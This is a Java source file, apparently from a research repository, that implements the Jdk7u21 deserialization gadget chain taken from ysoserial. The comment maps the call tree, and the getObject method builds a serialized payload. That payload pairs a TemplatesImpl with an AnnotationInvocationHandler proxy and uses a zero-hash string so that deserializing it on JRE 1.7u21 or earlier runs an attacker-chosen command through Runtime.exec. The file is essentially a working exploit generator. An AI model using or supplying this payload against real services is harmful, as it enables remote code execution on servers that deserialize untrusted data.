package com.threedr3am.bug.tomcat.sync.session.payload;

import com.threedr3am.bug.tomcat.sync.session.utils.Gadgets;
import com.threedr3am.bug.tomcat.sync.session.utils.Reflections;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;
import javax.xml.transform.Templates;

/*

Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has
the same JRE version requirements.

See: https://gist.github.com/frohoff/24af7913611f8406eaf3

Call tree:

LinkedHashSet.readObject()
  LinkedHashSet.add()
    ...
      TemplatesImpl.hashCode() (X)
  LinkedHashSet.add()
    ...
      Proxy(Templates).hashCode() (X)
        AnnotationInvocationHandler.invoke() (X)
          AnnotationInvocationHandler.hashCodeImpl() (X)
            String.hashCode() (0)
            AnnotationInvocationHandler.memberValueHashCode() (X)
              TemplatesImpl.hashCode() (X)
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
                  TemplatesImpl.newTransformer()
                    TemplatesImpl.getTransletInstance()
                      TemplatesImpl.defineTransletClasses()
                        ClassLoader.defineClass()
                        Class.newInstance()
                          ...
                            MaliciousClass.<clinit>()
                              ...
                                Runtime.exec()
 */

/**
 * code from ysoserial
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
public class Jdk7u21 implements Payload {

	public Object getObject(final String... command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		String zeroHashCodeStr = "f5a5a608";

		HashMap map = new HashMap();
		map.put(zeroHashCodeStr, "foo");

		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(
        Override.class, map);
		Reflections.setFieldValue(tempHandler, "type", Templates.class);
		Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

		LinkedHashSet set = new LinkedHashSet(); // maintain order
		set.add(templates);
		set.add(proxy);

		Reflections.setFieldValue(templates, "_auxClasses", null);
		Reflections.setFieldValue(templates, "_class", null);

		map.put(zeroHashCodeStr, templates); // swap in real object

		return set;
	}

}
